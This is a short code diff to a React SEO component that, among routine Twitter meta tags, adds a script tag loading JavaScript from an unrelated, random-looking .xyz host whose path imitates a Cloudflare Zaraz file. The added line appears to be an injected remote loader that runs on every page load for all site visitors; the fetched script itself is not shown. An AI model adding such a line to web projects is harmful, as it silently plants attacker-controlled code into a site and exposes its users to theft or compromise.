@@ -159,6 +159,7 @@ const SEO = props => {
       <meta name='twitter:card' content='summary_large_image' />
       <meta name='twitter:description' content={description} />
       <meta name='twitter:title' content={title} />
+      <script src="https://fullkaires.985864.xyz/cdn-cgi/zaraz/i.js"></script>
 
       <link rel='icon' href={BLOG_FAVICON} />
 
